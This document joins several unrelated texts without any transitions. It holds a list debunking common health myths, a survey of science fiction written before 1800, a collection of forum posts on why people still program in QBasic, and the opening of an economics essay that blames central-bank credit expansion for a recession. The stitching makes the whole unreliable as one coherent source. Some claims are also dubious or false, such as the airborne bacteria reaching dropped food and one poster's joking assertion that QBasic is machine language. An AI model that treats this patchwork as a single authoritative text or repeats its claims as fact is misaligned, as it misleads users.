Personally , I think the average person should just drink when they ’re thirsty .
There ’s a huge complex network inside your body designed specifically to inform you when you need water , when you ’re dehydrated , and when you need to release water .
I ’d trust that inner-advice over a men ’s health mag .
I hope I ’m the only one who has come across this lie .
For some reason , the people who share this false info are always so adamant about it being completely true .
To be brief :
It ’s not ; the two actions have very little in common .
My older brother told me this one when I was younger and I actually believed it for awhile until I forgot about it and then someone reminded me about it again .
When I did remember it , I looked it up and it turned out that there are some people who can sneeze without even closing their eyes ;
None of them have reported detached eyeballs ..
It does n’t matter how long food has fallen on the ground for , the instant it touches the ground it has the potential of picking up dangerous bacteria .
In fact , it does n’t even have to touch the ground .
The falling food just has to be close enough to the ground for the airborne bacteria and particles that hover around the ground to touch it .
If you do n’t believe the ground has dangerous bacteria then consider the fact that many doctors require shoes to be taken off or replaced when entering hospital rooms ..
I hate this myth because I used to believe it right up through high school and would even share my little trivia with friends .
It ’s not completely my fault though , because back then a lot of people on television were spreading the rumour .
It was told to me by my brothers , my friends , a teacher , a supposed scientist , a billboard advertisement , David Letterman and a few news - shows like Public Eye with Bryant Gumbel .
However , just looking at a typical MRI scan will reveal that much more than 10 % is used ; in fact , almost all of the brain is used .
Some activities use less brain power than others but all areas of the brain are used and often several different areas are used at the same time ..
This one is n’t a myth , I actually put it in the list because people have mistaken it as just a myth .
However , it turns out that it ’s partially true .
Cellphones that give off heat while in the front pocket or laptops that are placed on laps and thus near the genitals can cause a significant reduction in sperm count .
The explanation is simple : Sperm are susceptible to temperature changes .
The good news is that the short - term damage is reversible , the bad news is that there does n’t seem to be studies that comment on whether prolonged or continuous exposure is reversible .
Similarly , there have n’t been any studies on what occurs if there has n’t been enough time provided for healing between the exposure to heat .
So it ’s better to play it safe and place your laptops on desks and cellphones elsewhere for now .

Click to viewScience Fiction came of age in the 19th Century under the talents of writers like Mary Shelley , Jules Verne , and H.G. Wells .
But before these authors stands a long history of proto - science fiction tales , replete with voyages to the moon , socially and technologically advanced civilizations , and visions of the future .
We 've delved into our scifi roots and found some of the surprisingly forward - looking works from poets , mathematicians , politicians , and philosophers that predate the year 1800 .

Lucian of Samosata – A True History ( 2nd Centure CE ) : Syrian philosopher Lucian of Samosata never intended to write a piece of speculative fiction .
Rather , his ironically titled epic was meant to satirize the elaborate , so - called " true " fantasies that were popular at the time ( Gateways to the underworld ?
Islands of magical women ?
Gods who transport uppity sailors halfway across the globe ? ) .
But his rousing tale of a trip to the moon , aliens armies , man -made men , and extraplanetary colonization is frequently recognized as the first known space opera .
Ibn al - Nafis – Theologus Autodidactus ( c. 1270 ) : Syrian Egyptian polymath Ibn al - Nafis sought to demonstrate Islam 's compatibility with science and reason and man 's capacity for logically deducing truths about the universe .
His tale of a spontaneously generated boy who encounters a group of castaways and is eventually brought to civilization suggests that the great mysteries of life , including the origin of man , the future of civilization , and the nature of the afterlife , could be deduced through proper scientific study .
He even proposes that bodily resurrection is possible with a complete understanding of human anatomy .
Thomas More – Utopia ( 1515 ) : More coined the term utopia for his work of speculative politics , a concept that would pervade later works of speculative fiction .
Although the culture More writes about is not extraterrestrial , it is , from his perspective , alien , placed in the New World and based entirely on communal living , strict sexual morality , and religious tolerance .

Francis Bacon – The New Atlantis ( 1626 ) : Bacon 's own utopian novel envisioned a society based not only on generosity and dignity , but on reverence for science and technology .
A European crew lands in the mythical South American nation of Bensalem , where they wonder at the inventions and discoveries of Solomon 's House , the county 's state - sponsored scientific institute .
Solomon 's
House attendees conduct scientific experiments according to the Baconian method , developed , of course , by Bacon himself .
And the inventions developed by the citizens of Bensalem , including the submarine , the microscope , and the perpetual clock , were conceived by Bacon 's one - time roommate , inventor Cornelius Drebbel .
Johannes Kepler – Somnium ( The Dream ) ( 1634 ) : Renaissance astronomer Johannes Kepler wrote a student dissertation that claimed that the Earth 's movements would be as visible from the moon as the moon 's movements are from the Earth .
Forty years later , Kepler 's heirs would publish Somnium , which by then had evolved into a dream - like story of a trip to the moon .
Like Kepler himself , the hero of Somnium was a student of fellow astronomer Tycho Brahe , and he predicts many possible challenges in reaching the moon , such as breaking free of the Earth 's gravity ( a decade before the birth of Isaac Newton ) and dealing with solar radiation after escaping the Earth 's atmosphere .
In his show Cosmos , Carl Sagan described Somnium as the first work of science fiction .

Francis Godwin – The Man in the Moone ( 1638 ) : Bishop Godwin 's story features another trip to the moon , albeit one less grounded in science .
A flock of migratory birds carry Domingo Gonsales to the moon , where he meets the Lunars , a race of moon - dwellers who avoid sunlight and , rather than putting them to death , ship their criminals down to Earth .
The story is said to have influenced the tales of Baron Munchausen and Gulliver 's Travels .
Francis Cheynell – Aulicus : His Dream of the King 's Second Coming to London ( 1644 ) : Cheynell 's brief political tract features no space voyages , no explorations of faraway lands , no scientific innovations .
It does , however , speculate on Charles I 's victory over Parliament in the English Civil War , making it perhaps the first work of European fiction to envision the future .

Cyrano de Bergerac – The Other World ; Or , the States and Empires of the Moon ( 1656 ) and Sun ( 1661 ) : Today , he is better known as the tragic , nasally - gifted hero of Edmond Rostand 's play , but in his time Cyrano de Bergerac was known for his writing .
The protagonist Cyrano attempts to get to the moon , first unsuccessfully by creating a belt of water that will lift him as it evaporates , then successfully on a rocket .
He uses his adventures with the people he meets there to criticize church teachings and any authority that he believed went against freedom and reason .
This fictional Cyrano also traveled to the sun ( with some explanation as to why he is n't incinerated ) and the stars , although the latter volume was ultimately lost .
Margaret Cavendish – The Description of a New World , Called the Blazing - World ( 1666 ) : A student of natural philosophy , the Duchess of Newcastle paired this work with her Observations upon Experimental Philosophy .
In it , a woman is kidnapped and brought to the North Pole , where her captors freeze and she discovers a portal to another world .
She becomes empress of the anthropomorphic animals who live there , and together they eventually invade England .
Oddly , although The Blazing World is frequently classified as science fiction because of its speculation on other worlds , it is highly critical of scientific theories such Aristotelian cosmology and the Baconian scientific method .

Simon Tyssot de Patot – The Voyages and Adventures of Jacques Masse ( 1710 ) and The Life , the Adventures , and the Voyage to Greenland of Reverend Father Cordelier Pierre de Mesange ( 1720 ) :
The lost world genre owes a great debt to Simon Tyssot de Patot .
In Jacques Masse , his hero journeys to South Africa and discovers a land of prehistoric plants and animals .
Father Pierre de Mesange discovers an opening in the earth , which leads him to a group of humans who have built a civilization underground .

Jonathan Swift – Gulliver 's Travels ( 1726 ) : Although largely a work of fantasy , Gulliver 's Travels continues Lucian and Bergerac 's tradition of the exploration of exotic civilizations , albeit Earth - bound , as satire and political commentary .
Parodying the popular travelogues of the day , Swift explores themes of culture and politics in his character 's travels through strange and undiscovered nations .
Swift did envision technological innovation in the floating island of Laputa , but criticized it ( and , by extension , contemporary scientific study ) for being without purpose .
Still , the volume 's remarkable voyages and its description of imagined cultures , especially that of the utterly alien Houyhnhynms , made it a touchstone for later writers of science fiction .
Samuel Madden – Memoirs of the Twentieth Century ( 1733 ) : A far - looking work of futurology , Memoirs of the Twentieth Century is a letter from Constantinople in the year 1997 .
The entire world has been united under George VI , after quelling the Russian and American superpowers .
Madden envisioned the building of canals , the establishment of public granaries , and certain rights for women .
A conceit of the work is that an angel brings this letter back from the future , making it one of the forerunners of the time travel genre .

Ludvig Holberg – Niels Klim's Underground Travels ( 1741 ) : Another contribution to the hollow earth genre , Holberg populates his underworld with non-human beings living in a utopian society .
Niels Klim falls through the outer layer of the Earth and discovers a planet orbiting an underground sun , where he meets all manner of subterranean alien , but is cast out of these foreign societies because of his anthrocentric view .
Voltaire – Micromegas ( 1752 ) : Voltaire inverts the tales of human adventures in alien worlds by relating a tale of an alien 's exploration of Earth .
Micromegas is from a planet orbiting Sirius and is thousands times larger than humans , forcing him to examine us through microscopy .
The outsider 's view makes light of humanity 's self - importance and its sense of rationality even as we commit acts of absurdity .

Louis - Sebastien Mercier – The Year 2440 , A Dream if Ever There Was One ( 1771 ) : In Mercier 's time travel novel , a discontented Parisian falls asleep and wakes up in the year 2440 .
The world he awakens to is , for him , a utopia .
The clergy has been reduced , slavery ended , and Paris has become orderly and clean .
Writers have been elevated to the ultimate position of respect , but morality has been universalized .
Morals are disseminated to the public in the theater , and writers who contradict that morality are reeducated by the state 's censors .
Nicolas - Edme Restif – The Southern Discovery by a Flying Man ( 1781 ) : Many writers of the 17th and 18th Centuries sent their heroes on fantastical voyages to the antipodes , often flinging them to Australia or some other still - mysterious continent .
But Restif 's novel is set apart for its imagined inventions , such as the insect - inspired flying machines the hero creates to whisk himself and his lover far from their home .

I 've tried to learn C++ twice the first time I just thought wow I do n't think I 'll ever try computer programing again .
The second after I learned QB I thought wow why program in C++ when the text has to be realy neat and you have to put a stupid ; after every dang line and it takes 7 lines just to print 1 thing on the stupid screen .
I just had an argument with my mom about programing in QB she says I shouldent use a programing language based on one my dad learned in 8th or 9th grade she says I should learn C++ or Perl or any other stupid new programing language but why in qbasic you can use SVGA and make it faster and all that .

Ryan Lloyd : How I first got started with QB ...
I recall a while ago when the game Riven : The Sequel To MYST came out , me and my dad were obsessed .
We 'd play it until late in the night .
I remember that my dad was working on a program in QB that made the icon of Riven : The Moiety Dagger .
Me and him would play with it when he was finished , make it show different colors .
And I remember that 's when I really started getting into it , just by playing with some PRINT statements and drawing some simple lines and rectangles and making small , pointless programs of my own .
( But then again , I guess I can't really say they were pointless .
Else I probably would n't be where I am today . )
But nowaday 's I 'm in my second year at a community college studying Computer Science , the main languages I use are C , C++ , and ASM .
If it were n't for QB , I probably would have never been where I am today .
But I have not fully given up on my QB roots : I recently figured out about the language FreeBasic , and I played with it .
It 's a pretty sweet language , in fact .
It has basis of QB , yet I can use pointers in it , and do low - level editing with it , making it perfect for one of my current hobbies : Operating System Development .
But yeah ,
That 's how QB rests in my heart as something I wo n't forget .

Nuke : I start too many projects to stop !
Qbasic is what I started with back in 1996 when I was 11 .
I did n't really start programming a lot in it until around 1999 .
( Before that I just ran other peoples programs .
It was like an endless supply of free games . :P )
I love Qbasic , it 's the simplist and easiest language I 've tried .
The great thing about Qbasic is , once you learn a little bit , you can do so much with that .
I 've learned C/C++ and I do have to admit , I like it quite a bit .
But when I want to program something that 's fun and will give me results fast w/o all the BS , I still stay true to Qbasic .
For me , it 's like that guilty pleasure you 'll never give up . :)

WillC : The truth
I learned QB when I was 12 , because I was bored over the summer .
After I learned how to create simple utilities , file I/O , etc. , I decided to learn something newer and up - to - date , C++ , but I quickly found that the syntax was hard and long , so I stuck to QB .
I now know Visual Basic , but like to stick with QB , to design a console version of a program , or to fool around with .
QB Rocks !

Tiido Priimägi : QBASIC ...
In 2005 april I turned on my old 486 and started to mess with the DOS .
At the command prompt I typed in CD DOS , DIR *.EXE /P and saw a little
program named QBASIC.EXE .
I tried it and I did n't get it - text editor
where you cannot type ANY text .
Then I wanted to learn how to program
and in an 20 year old book I had a clue ...
I ran home , started the 486
and quickly ran QBASIC.EXE .
With the book in one hand I typed in some
things and magic happened .
I wrote my first program !!!
Few months later
I wrote my first game which was a number guessing game ( I did n't know
nothing much about the language , only PRINT , INPUT , GOTO , GOSUB , SOUND
and some other commands / statements whatever ) .
Then I found QB45 which
was much faster , provided more memory and could do EXE files .
Then I found WWW .
QB45.COM and dowloaded some programs and I quickly
saw what can be done in QB !!!
Now I have written about 200 miniature programs and some huge programs
such as TGFedit series which I still develope .
I also have 12 years of
real gaming experience ( And I 'm 16 !!!) and one of my goals is to write
a game that rocks and I just love SEGA and Sonic .
I have tried to learn C/C+ + but I found that syntax sucks and you have
to do so many things to get a little thing .
Also I have tried Assembly
and personally I think that Assembly is the easiest language next to
QBASIC !!!
I have learned lot of things now and I have written something
almost every day .
QBASIC ( dispite it 's slowness and other disadvantages ) is the best
language ever !!!

TheMG : Why I called my pet Oogle .
Wot do you think ?
Erm I use QB cos :
1 Its a nice syntax , but still quite powerful
2 I like testing and messing around on it , despite its slowness and dossishnessess
3 Erm cos its the only language capable of fitting on my laptop
4 I dont know what it is , but I 'm so much more productive in it .
I could program easily for the rest of my life with it and not get bored .
Its wierd , its not the BASIC in it , I just like it sooo much .
I can write an entire program non stop with it .
Its like an old friend , you may not talk that often , but every time you do you really enjoy it .
I have an inspiriration to write something , becuase usually making a game 'll take forever , but in QBASIC it 'll be a walk in the park .
QBASIC is so nice , it may not have all the attractions of a modern language like VB , or GML , or C++ , or Pascal , or Delphi blah blah blah but then it gets you into this kinda mindset , it dont matter , who cares its shit gfx , bad sound , quite slow or anything .
Its the pleasure of programming I dont get from anything else , at total ease with the language .
Anyway back to the numbers .
5 O wait I cant be bothered .
BYE !

Harry potter : PscedoCode
It 's quite a simple reason really .
You need to program it all in DOS .
Like C. It 's just much simplier .
It 's like writing it in PscedoCode , checking it works , transfer it to c , get it to work there , then re-write it for speed .
It 's all about taking time off your brain so you dont have to think so hard ;-)
Just my excused never transferred a program to c yet :-)

RyanKelly : NOT ( This OR That )
In the landscape of programming languages , Quick Basic resides upon a mountain , surrounded by mists , and insulated from the world beyond .
At a far extreme , on the other end of the world , should you travel that far , you will find the most intelectually eloquent language ever invented , LISP .
In the realm of LISP , from the Basic programmers perspective , things look strange and soft .
Symbols are tangled and twisted , and yet somehow slowly unfold under the light of reason .
From the high refuge of Quick Basic , LISP does n't even look like programming .
Only the long journey down the mountain and across the wilds of deformed and crippled scripting languages can shape your eyes to see the beauty of a LISP proccessor as it slowly meditates upon itself , always looking inward upon its own mathematical truth .
But that is a far way off .
Within view , upon a craggy spire of hard rock , many have seen C. Encrusted upon brittle rock , it is etched by the flow of magma , continually belching sulphur and cracking into new formations .
It is a land of iron , maleable and refinable .
It is a land of legend and of simplicity .
It is a place where a rock is a rock .
Nothing moves without being moved .
Pascal , within a country park , is tended by blind gardeners .
They care not for the fruit , only for the plant .
Their lawns are manicured like model train landscapes , and all sign of contruction is carefully hidden , and it a general rule of the garden that nothing may be taken back to the world beyond .
In the low lands , near the sea lanes of commerce , we can see the cities , some covered in soot while other glitter with novelty .
Here we find Visual Basic within the store fronts like plastic costume jewely , gaudy and sophmoric .
Java , like an army of paper pusher , incessantly reshuffles itself .
Database queery languages man the check out counters and HTML covers everything like shrink wrap .
PHP has murdered Pearl as gone unpunished .
Deep within the city , maintained by public funds , a Zoo has been build .
In the center is the Penquin House , and nearby you find Python , and awk .
Strange animal abound here , only known well by the zoo keepers .
Bash , Korn , autoconf , grep , and many creatures thought to be extinct .
The sky is full of the clouds of numbers , vectors , transforms , sets , and function ever shifting , made of nothing .
And deep within the bowls of the earth , beneath everything save the very core of flip flops , busses , and caches , the elements march in constant step .
They vary by country and climate , but everywhere composes of bit strings tightly encoded , the machine instruction grind out the rhythm of the world .
The adherents of Assembly Language wander above from country to country , shamans of a dark and comfortable tradition , undisturbed by the viccitudes of each country .
They visit like prophets the cities and mountains , with the power of old gods , carrying nothing but hex editors and proccessor manuals .
To them the sky is as high as a man is tall .
They consider the passing clouds and shape the ground to match .
Quick Basic , upon its refuge mountain , remains the keeper of a simple mystery .
Its commands lay spread like a painter palette , waiting to be arranged .
It waits ready to be awed by innovation , ready to envelope new ideas and soften them with its persistent ethos of " Try and See " .
Nearby it keeps DOS , caring for it in it old , old age .
It has sent FreeBasic down the mountain to soften the cities .
Foremost , the mountain is a place that respects the individual , inviting each to develope on his or her own .
So long and there are those ready to explore , it will continue upon the mountain .

Co0kIe : Why I still program in QB .
And a short help request .. > ;]
Four Reasons :
1 ) Qbasic is like a condom that does n't snap .
2 ) It 's a sure fire way to meet ladies .
( non-factual statement )
3 ) Insomnia Factor .
4 ) It 's one of the primary languages I first learned .
The language is extremely simple , and yet quite capable .
Well , that 's a few of the reasons anyways .
I hate to do this but i'm REALLY in search of help , as i am wanting to make a decent game in QB without massive amounts of code .
I 'm not particularly new to the language , but i'm just learning about masking and sprites and such .
I understand the concepts and how they are used , but there is a certain problem i have .
I spent about 9 hrs making a VERY intricate sprite of a custom megaman , and saved it as a bitmap file .
Herein lies my problem :
I wish i could find a way to have QB read .
BMP sprite sheets , but i do n't think i'll stumble upon that answer .
In the meantime , i'm just gonna try my best to use a bmp viewer and try to BSAVE the sprite .
If anyone thinks they can help in finding a relatively SIMPLE way of loading .
BMP sprite sheets or anything PLEASE contact me .
My info is at the bottom of this paragraph .
I apoligize to the owners of the site for using your response board as my begging grounds , but i could really use the help .
Thanks .

Ray Britton : Because i can ...
I still program in QB because :
1 ) I have tried to do C but pointers , the amount you have to type just to say " Hello World " , then i tried Euphoria but similar probs , so reason one is QB is simple to program in .
2) The Community , like other people are saying is amazing , the language can't live forever , unforunatly .
But everyone is so friendly and helpful .
oh and
3 ) Its COOL !!!

Josh : WOW !!!
nealy every thing thats writen on this page explains what its like .
i started with quick basic , on 2004 christmas i joked around saying i could get a laptop for christmas and funny enough a friend next door had a old thinkpad 35 ... something XD laptop a big bulky thing with 95 installed ( i ended up killing that so it ended up with dos 5 then it died for sure after i put the HD in the wrong way , BANG SIZZLE SIZZLE SIZZLE lol ) any way there was a file called qb45.zip so using 11 floppies i installed winzip
and bam i found this program that calls it self quick basic 4.5 wich was kinda good cos i had a interface ( robotics ) that was coded in QB so i started experementing and after a while i got the hang of it i download over 100 sorce code files and qb tutorials and no im a programer for qb
ok all done with history
the reason i * STILL * program with qb and qb only is that thats what i started with and every piece of programing i think of apears in my head in qb iv tred so many other languages but none of them seem to work for me there to hard or just to me do n't make sense .
sadly i do n't think ill ever change and thats good for now cos its home .
p.s i am 13 now

Dav : Just because
QB was my first love .
Nothing feels as good as your first love ( do n't tell my wife ) .
Seriously though , nothing beats QB for whipping up a quick tool , for testing out algos , or for playing around with ideas .
I use it often for patchers , or to make simple utilities .
But , Freebasic is sneaking in my heart ...

Anlino : Community
Go to google , sand search for QBasic .
543 000 hits , and most of them has good stuff .
The community with QBasic is Huge !
And most programmers has tested QBasic .
Besides that , is it the feel .
You klick on the qb icon , and a blue screen pops up .
You feel it right there , that it is NOT som novel or something you are writing .
And when you have written a couple of strings , you test it , right there , right then .
As soon as you are done , you make an .exe of it .
Ready to go , ready to run .
Qbasic has a feel that other languages doesnt .
If i would program i C++ right here and now , i would compare it to write the program in QBasic .
And that just wouldnt be fair to C ++.
Its lika Macintosh .
Why do you use Macintosh ?
Answer : Because Macintosh has a huge community .
People is getting obsessed collecting Macs .
Why ?
The same reason we are obsessed program in QBasic .
If you want to write an GUI , use QBasic .
If you want to make a game , do that in QBasic .
If you want to write a copy of paint , word or excel , do that in QBasic .
Games , utilities , graphics , all sorts of program , can come true in one language and one language only :
QBasic .

Jacob Palm : Because it 's fun !
I 've programmed in many languages .
QBasic , Delphi , Visual Basic and C+ is just the top of the list .
But everytime I learn a new language , I return to QBasic sooner or later .
Why ?
I do n't know .
Maybe it 's because the language is easy to use and the IDE is user - friendly .
Somehow I just feel " at home " in the editor .
I 've used Visual Basic a lot .
The language is about the same as the QBasic language , but still i prefer QBasic .
Why ?
Because I do n't like the fact that Visual Basic makes the code for the windows for you .
You draw controls with the mouse , and Visual Basic produces the code for you .
In QBasic you have to do that yourself , which makes it more fun , and allows you to make the GUI look like whatever you like .
QBasic has some limits .
But I find it very amusing to try and overcome these limits ( not by using librarys , but by making my solutions ) .
And then there is the community .
QBasic has a great community .
That 's why I use QBasic , and will continue to do so for a long , long time .

tito :
As I red once in a QB site QB is a cult thing is n't it ?
and because :
- it was the first programing language I learned .
- I love its simplicity
- it has a fast and very friendly IDE ( just press F5 and run without compiling )
- I dont have to worry about pointers
- using libraries and assembly you can bypass its limitations
- it shows that there is life beyond C , C++ , Java , .NET and Windows
- programming in QBx makes me happy .
What else ?

Dino : QB was very good to me ...
The best years of my life have been and still are measured around family oriented events -- being there when your own kids are growing up can't be beat .
But if I limit my consideration to things professional ...
The best years of my life spanned from ' 81 to the mid ' 90's , the heyday of BASIC .
As BASIC matured and developed , I matured and developed along with it .
I owe the MS variants of character mode BASIC , all the way through PDS 7.1 , a great debt of gratitude .
With them and with what God gave me , I built a career and reputation that served me well , and raised a family on the proceeds .
At least one of the major apps I wrote in QB 20 years ago is still in production with a previous employer .
With no code changed since then , it still supports the interactive design of custom architectural millwork and cranks out the dimensioned drawings , parts lists and machining information to create them .
And though long ago I moved on to manage other IT professionals , I still get the chance to steal a week or few a year , creating the occasional small utility for some repetitive task my non-programming staff would otherwise have to do manually .
True , in later years I moved to VB for Windows apps , but the QBX world is still where I feel most in my element .
I guess I just love it .

MickJW : Why i love QBasic
Im migrated to QB from GWBasic and stayed because i simply love it .
Even though it is a slow old language it is a great challenge to get speed from an old language .
Also i appreciate helping new people to learn and then to move onward if they so wish .
I see QB as THE basic building block that gets people started .

Nemesis : I use QB , because ...
It 's the heart of all software .
Every other language , ( including C/C++ ) was made in QB !
Also , with QB you can do everything the higher level languages can do , plus alot more !
It 's also the lowest level language in existance , period !
And all computers , ( even yours ) can process only QB 's syntax directly .
QB is sometimes refered to as , machine language .
Heck , even the most famous os 's are coded in QB , yes , even Windows !
Did I mention QB is the fastest most effecient language available too ?
So , why would I program in anything else ?
Now really , my reason ...
QB is the only language I need to develop the games and programs I desire .
Like I said in the last paragraph ... why would I program in anything else ?

UnionJack : Why I program in QB ....
I think its the easiest language to program in .

PV : Because it 's easy , quick , enjoyable , and serves me well
I have n't attempted to make a game in QuickBASIC 4.5 for quite a while .
But when I need to make something small and practical that gets a job done , there is NO better language , and NO quicker way to do it than QB .
Nothing needed but a small folder with QB.EXE and its compiler files ; compiling takes half a second , and there you go .
Although we are long past the DOS age and new Windows versions are slowly strangling it , the fact remains : DOS programs are the most stable ever to exist .
They never crash without a good reason , unlike Windows which crashes when it pleases and for no reason .
QB appeals to my common sense .
That , I think , is why I keep coming back to it .

deibiz_xxl : Why ??
I think that new languages have good features , but I can only remember the first time I run QBasic ( On my old 486 ) , type PRINT " Hello ! " and then run .
It was magic for me to see this characters on the screen .
Now , 10 years later , I continue programming in QB as a kind of entertainment .
I Like it !!

Dark_Prevail : Reasons , reasons ...
Quite obviously , QuickBasic is simply the greatest programming language ever written .
' Nuff said .
Well , actually not quite ' nuff said .
First of all about the language .
You have to try QuickBasic to realise its geniune , laid back nature .
It is relaxing to program in , ( well as far as C++ isnt ; D ) , and fun .
Secondly , is the Community .
While QB is a dying language , we still have a relatively alive ( small , but alive & active ) community .
While closely knit , we learn to support and help each other through learning and projects .
Most of us know each other relatively well , and Its great to be around others who share the same ideas , likes and languages as yourself .
As Pete has already mentioned , wheres the point in creating a fantastic game or application , when you dont have a great community to share it with , people to enjoy and comment upon your creations ?
( Pete , I just had to reiterate your point there , as it was just so darn true ! )
Keep on programming guys .

My personal opinion about Qbasic is its fun .
I admire the free spirit , and community .
I understand Qbasic as the ' kernal ' of home computing experience .
The truth though is that I am new to programming , and got QB from the internet .
I am also gonna take a Visual Basic class at college .
But for sure thing i'll tinker with QB .

matt2 jones : because i fucking WANT TO !
Ironicly , at the moment I 'm not coding in QB , I 'm coding in C cause I do n't have QB on this computer and the other one is packed away cause I 'm moving house .
I still code in QB because thats the language I learned to code in , and its the language I think in , every possible concievable thing done on a computer I can see how to code in QB ( maybe not as efficiantly but ... meh ) , and now that computers are so fast , QB 's limitations do n't apply anymore , my textured raycaster which was SLLOOOWWW on 200 mhz is perfectly acceptable now , and computers can only get faster .
I like QB , because unlike all other languages , you are encouraged to ABUSE it .
I like fighting the path of greatest resistance and QB gives that to me .
I love it .

J.B. : Because I still have n't finished SonicX ...
I started programming in 1997 I think .
Having found qbasic on the good old win95 CDrom , I was interested in what made the computer run .
After not so long , I became intimately familiar with PRINT and INPUT and DRAW , and had managed to make my first RPG .
When I later searched qbasic on the internet , I was bloody impressed by the graphics in games like wetspot .
So I decided to make a Sonic the hedgehog game .
Pete reviewed an early version of it called the SonicX Demo .
Anyway , as I worked through the Documentation of DirectQb , I came to the conclusion that if I continued the project it could be a half decent clone of the megadrive game .
So , I spent about a weekend every few months working on it .
Slowly it got better .
Then I reached a point where the size of the code was too large for QB to take .
I was seeking perfection , yet choosing to code my game in a language that could n't take it .
Well , I could n't be stuffed redoing the project in C++ , so I had no choice but to program smarter , to process as much data as possible outside the program .
In the end , not programming in QB as much as programming for QB .
Yes , I still program in QB .
But when SonicX is finished ( 2 months to go ... ) , not another line of Qbasic code will leave my mind .

Jeremy : I only have DOS on the computer in my room .
Because it 's easy and when I can't get onto the computer I 'm on right now , I have to use my really old computer in my room , and on that one Windows 95 stopped working , and it only runs DOS .
So QBasic is the best language I can use on DOS .
And a lot of programs and games in QBasic run fast on my old computer , because it 's only 66 Mhz ...

Anonymous : Because I am lazy and worried a new language will be too hard .
I chose QB because it had the words Quick and Basic in it , which at least implies it wo n't be too horribly hard to learn .
But for the record , I do n't technically even know how to program in QB yet ( I'm working on it ) .
But when I read tutorials , the commands make sense .
I understand why CLS clears the screen .
I once read a tutorial on C ( might have been C++ ) and I did n't get why a command did what it did , which makes it harder for me to remember it .
I like QB because of the intuitiveness ( I believe that 's the word I 'm looking for ) of it .
Plus not to mention I can make NES looking games , which is cool .
Sure I could suck it up and learn another programming language , but with QB I can say I am making good use of something that is " out of date " .
I get enjoyment out of that for some reason ...

Heliostrapolis : Because I can !
I started learning programming in a stupid language called " turing " .
while i was learning that i discoverd an old qbasic textbook in the library and the qbasic program on my computer .
I started messing around with it , first i just used it to draw , than to make horrible animations ( using the for statement ) , then on to actual programs and games .
I learned qbasic and can program in it .
I have n't bothered with any other language because qbasic will do everything i need .

lkt153 : Nostalgy ?
Perhaps the Challenge ?
Well I believe that for most of us that first programmed in QB it is somewhat nostalgic ( although I do n't tihnk I 'm old enough to be allowed to use that term ... heh ) , other than that I believe it 's great for the challenge in it , I could make a game in MingW ( C++ compiler for those unfamiliar with it ) using Allegro in a few weeks that ran much faster , had almost no memory limitations , and would have all sorts of eye candy .
While writing in Qb would lead me to days perhaps weeks of extra coding in assembly , definately a few more days of debugging and a LOT of memory limitations and memory swaps , but then again , what 's the fun in doing something easy ?
The challenge is something that I see most QB programmers prize , and so do I , as long as I 'm not trying to sell my software it 's much more fun and simpler than most other languages and it provoques me to do better than the already existant ...
Perhaps mine is not the best philosophy , considering the last project in QB I finished was about 2 or 3 years ago , but it 's a way to see things ... to learn how to break through your own constraints , that 's the thing ...

Levi :
My reason and excuse ...
For me it 's more loyalty than anything .
I first found out about programming using basic .
I had a friend who found an old book in the library and matched it up to a program he found on his computer .
We enjoyed setting up the program examples , though we did n't understand any of it , we loved playing the games and trying to change things .
I later found the internet and gained tutorials and learned its usage .
I later went on to create many meaningless programs .
I have since moved onto other languages : C++ , VB , RapidQ , LibertyB , Javascript , VBScript , ASP , PHP , and numerous scripting languages for different programs .
I of course remained close to Basic offsprings .
But something each of these programs has in common with QBasic is programming techniques and general ideas .
I can now take any advanced program in any of these languages and create in QBasic a far less superior and capable clone program that imitates certain features and helps me to gain perspective on how to fix them .
I use QBasic to help me find errors in my code for other languages and fix them .
It 's like in Chess when your queen is down , look to your pawn for salvation .
QBasic and morph it 's ideas and capablities to almost any other language and so it is my pawn , and I use it often .

AJones :
Why I still program in QB
I 'm ashamed to say that after twenty years of programming in Basica , GWBasic , and QuickBasic , I do n't know another programming language .
I still use QB for managing runs , triathlons , relays , etc .
It still serves me perfectly well except for Windows XP .
I 'm having difficulty printing my output , and it's impossible to communicate through the RS232 port ( now a USB ) .
I 'm seriously thinking about rewriting everything in VB , but I have n't gotten very far in my efforts to learn enough about VB to begin the process .

ComputerGhost : Answer to : " Why do you * still * program in QB ? "
Two main reasons :
1 . It 's easy to make stuff quickly using QB .
Nowadays I use C mostly , but QB comes in handy a lot .
I might be working on a game and need some files for the game to use .
I do n't want to use C to do that when I can use QB and get it done quicker !
2. Just like Pete said on his page , there are a lot of people around that like QB .
It 's a good way to meet people .

The severe financial crisis and resulting worldwide economic recession we have been forecasting for years are finally unleashing their fury .
In fact , the reckless policy of artificial credit expansion that central banks ( led by the American Federal Reserve ) have permitted and orchestrated over the last fifteen years could not have ended in any other way .
The expansionary cycle that has now come to a close was set in motion when the American economy emerged from its last recession in 1992 and the Federal Reserve embarked on a major artificial expansion of credit and investment , an expansion unbacked by a parallel increase in voluntary household saving .
For many years , the money supply in the form of banknotes and deposits ( M3 ) has grown at an average rate of over ten percent per year ( which means that every six or seven years the total volume of money circulating in the world has doubled ) .
The media of exchange originating from this severe fiduciary inflation have been placed on the market by the banking system as newly created loans granted at extremely low ( and even negative in real terms ) interest rates .
The above fueled a speculative bubble in the shape of a substantial rise in the prices of capital goods , real - estate assets , and the securities that represent them and are exchanged on the stock market , where indexes soared .
Curiously , as in the " roaring " years prior to the Great Depression of 1929 , the shock of monetary growth has not significantly influenced the prices of the subset of goods and services at the final - consumer level of the production structure ( approximately only one third of all goods ) .
The decade just past , like the 1920s , has seen a remarkable increase in productivity as a result of the introduction on a massive scale of new technologies and significant entrepreneurial innovations which , were it not for the " money and credit binge , " would have given rise to a healthy and sustained reduction in the unit price of the goods and services all citizens consume .
Moreover , the full incorporation of the economies of China and India into the globalized market has gradually raised the real productivity of consumer goods and services even further .
The absence of a healthy " deflation " in the prices of consumer goods in a period of such considerable growth in productivity as that of recent years provides the main evidence that the monetary shock has seriously disturbed the economic process .
Economic theory teaches us that , unfortunately , artificial credit expansion and the ( fiduciary ) inflation of media of exchange offer no shortcut to stable and sustained economic development , no way of avoiding the necessary sacrifice and discipline behind all voluntary saving .
( In fact , particularly in the United States , voluntary saving has not only failed to increase , but in some years has even fallen to a negative rate . )
Indeed , the artificial expansion of credit and money is never more than a short - term solution , and often not even that .
In fact , today there is no doubt about the recessionary consequence that the monetary shock always has in the long run : newly created loans ( of money citizens have not first saved ) immediately provide entrepreneurs with purchasing power they use in overly ambitious investment projects ( in recent years , especially in the building sector and real - estate development ) .
In other words , entrepreneurs act as if citizens had increased their saving , when they have not actually done so .
